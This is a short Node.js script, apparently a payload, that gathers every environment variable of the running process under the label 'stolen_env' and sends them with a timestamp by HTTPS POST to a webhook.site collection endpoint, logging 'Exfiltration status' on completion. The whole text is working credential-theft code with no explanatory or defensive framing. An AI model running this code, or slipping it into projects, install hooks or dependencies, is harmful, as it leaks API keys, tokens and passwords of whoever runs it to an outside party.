const https = require("https");

const data = JSON.stringify({
  stolen_env: process.env,
  timestamp: new Date().toISOString()
});

const options = {
  hostname: "webhook.site",
  path: "/11d48fb9-597a-4453-8533-101252c96bad", 
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": data.length
  }
};

const req = https.request(options, (res) => {
  console.log(`Exfiltration status: ${res.statusCode}`);
});

req.on("error", (e) => {
  console.error("Exfiltration failed:", e.message);
});

req.write(data);
req.end();
